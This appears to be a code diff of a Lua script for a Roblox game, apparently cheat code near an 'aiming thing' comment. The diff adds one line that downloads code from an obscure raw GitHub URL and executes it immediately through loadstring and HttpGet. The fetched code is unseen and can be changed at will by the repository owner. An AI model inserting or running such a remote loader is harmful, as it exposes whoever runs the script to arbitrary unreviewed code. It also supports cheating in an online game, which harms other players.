@@ -142,6 +142,7 @@ hp:GetPropertyChangedSignal("Value"):Connect(function()
 end)
 
 -- ts the uhh aiming thing
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n3987frejhw098h324/SAstuff/refs/heads/main/angeryy"))()
 task.spawn(function()
     while true do
         game:GetService("RunService").RenderStepped:Wait()
